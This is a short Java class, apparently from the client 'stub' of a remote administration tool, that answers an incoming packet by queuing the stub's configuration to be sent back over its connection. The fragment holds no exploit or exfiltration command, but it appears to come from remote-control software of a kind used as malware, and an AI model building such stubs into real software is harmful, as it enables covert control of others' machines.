package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Main;
import com.redpois0n.stub.stub.packets.outgoing.Packet66Config;

public class Packet88StubConfig extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {		
		Connection.addToSendQueue(new Packet66Config(Main.config));
	}

}
